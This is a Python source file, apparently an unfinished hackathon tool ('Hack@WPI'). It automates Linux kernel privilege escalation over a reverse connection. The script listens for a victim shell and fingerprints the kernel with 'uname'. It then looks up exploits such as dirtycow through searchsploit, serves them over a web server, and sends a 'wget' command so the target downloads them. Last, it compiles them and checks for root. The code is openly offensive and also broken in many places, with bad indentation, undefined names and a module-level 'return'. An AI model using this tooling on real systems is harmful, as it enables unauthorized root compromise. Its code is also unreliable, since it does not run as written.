#TODO
# 1) write script to send kernel version to searchsploit
# 2) parse searchsploit output for path to kernel exploit (look for dirtycow)
# 3) implement wget to download script 
# 4) compile exploit and parse getuid() output to check if we are root, if not try another exploit
# 5) write CLI interface to make user interaction easy 
# 6) make a webserver to host C files

import socket
import os
import re
import json
import wget
import base64

def welcome():
  
	print(" /$$   /$$                     /$$           /$$$$$$     /$$      /$$ /$$$$$$$  /$$$$$$ ")
	print("| $$  | $$                    | $$         /$$$__  $$$  | $$  /$ | $$| $$__  $$|_  $$_/ ")
	print("| $$  | $$  /$$$$$$   /$$$$$$$| $$   /$$  /$$_/  \_  $$ | $$ /$$$| $$| $$  \ $$  | $$   ")
	print("| $$$$$$$$ |____  $$ /$$_____/| $$  /$$/ /$$/ /$$$$$  $$| $$/$$ $$ $$| $$$$$$$/  | $$   ")
	print("| $$__  $$  /$$$$$$$| $$      | $$$$$$/ | $$ /$$  $$| $$| $$$$_  $$$$| $$____/   | $$   ")
	print("| $$  | $$ /$$__  $$| $$      | $$_  $$ | $$| $$\ $$| $$| $$$/ \  $$$| $$        | $$   ")
	print("| $$  | $$|  $$$$$$$|  $$$$$$$| $$ \  $$| $$|  $$$$$$$$/| $$/   \  $$| $$       /$$$$$$ ")
	print("|__/  |__/ \_______/ \_______/|__/  \__/|  $$\________/ |__/     \__/|__/      |______/ ")
  print("	                                       \  $$$   /$$$                                   ")
  print("  	                                      \_  $$$$$$_/                                   ")
  print("    	                                      \______/                                     ")



# This is the code to be sent to the remote
  
files = output.split("\n")
  
for file in files:
  compiled_filename = file.strip(".c")
    
  os.system("gcc " + file + " -lcrypt -ssl " + "-o " + compiled_filename)
  user_id = os.system("id")
    
  pattern = "uid=0"
  uid_results = re.findall(pattern, user_id)
    
  while uid_results != []:
    return # success
    
return # fail
    

def parse_version(kernel_version):
  pattern = "(\\d+.{1})+"
  data = re.search(pattern, kernel_version)
  # The first element of this should be the kernel version
  return data[0]

def start_webserver(file_paths):
  
  working_directory = os.system("pwd")
  
  for path in file_paths:
    os.system("cp " + path + " " + working_directory)
  
  host = "0.0.0.0"
  port = 80
  
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.bind((host, port))
  s.listen(5)
  
  connection, addr = s.accept()
  # Check for success
  # Spawn shell

def parse_searchsploit_output(possible_exploits, version): #parse possible exploits for reliable exploits and get paths to host

  version = version.replace(".", "\.") # Maybe?
  pattern = "\w*(?<![\d\.])" + version # Look for "2.4.* NOT *.2.4"
  
  # Look through JSON, iterate through each Title field, parse version.
  search_json = json.loads(possible_exploits)
  search_json = search_json["RESULTS_EXPLOIT"]
  
  exploit_paths = []
  
	for exploit in search_json:
    title = exploit["Title"]
    results = re.search(pattern, title)
    
    if len(results) != 0:
      path = exploit["Path"]
      exploit_paths.append(path)
  
  start_webserver(exploit_paths)

def exploit_lookup(parsed_data, version):
  
  command = "searchsploit " + parsed_data + " -j"
  
  possible_exploits = os.system(command)
  parse_searchsploit_output(possible_exploits, version)

def start_listener():
  
  host = "0.0.0.0"
  port = int(input("[Hack@WPI] Enter the port to listen on: "))
  command = "uname -a"
  
  socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  socket.bind((host, port))
	socket.listen(5) #allow up to 5 connections
  
  conn, addr = socket.accept()
  
  with conn:
    print("[Hack@WPI] Connection from: ", addr)
    
    conn.sendall(command)
    kernel_version = conn.recv(1024) #receive the kernel version
    
    parsed_data = parse_version(kernel_version)
    search_params = "Linux Kernel " + parsed_data
    exploit_lookup(search_params, parsed_data)
    
    wget_command = "wget -r http://127.0.0.1/ /tmp"
    conn.sendall(wget_command)	
    
    ls_command = "cd /tmp; ls"
    ls_output = os.system(ls_command)
    
    parse_ls(ls_output)
    
  

#main function
def main():
  welcome()
  start_listener()

if __name__ == '__main__':
	main()
